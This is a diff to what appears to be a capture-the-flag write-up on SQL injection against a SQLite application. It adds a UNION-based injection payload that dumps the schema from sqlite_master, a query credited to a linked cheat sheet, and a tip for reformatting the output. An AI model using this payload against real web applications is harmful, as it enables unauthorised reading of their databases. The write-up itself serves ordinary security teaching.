@@ -26,4 +26,15 @@ we can infer the number of columns which leads us to 9 since there is an error m
 
 ![sqli2.png](sqli2.png)
 
+To dump sqlite schema, we can use the following sql select statement cheatsheet from [https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)
+```sql
+SELECT sql FROM sqlite_master WHERE type='table'
+```
 
+To combine with our sql union select statement `asd'))+union+select+sql,2,3,4,5,6,7,8,9+from+sqlite_master+where+type='table'--`
+
+![sqli3.png](sqli3.png)
+
+We have completed the challenge, but since this is a little not very 'humanly readable'. We could do the simple trick of copy paste it to sublime, and replace all 'TABLE' word with ENTER key. We have a the schema in a easier to see format
+
+![sqli4.png](sqli4.png)
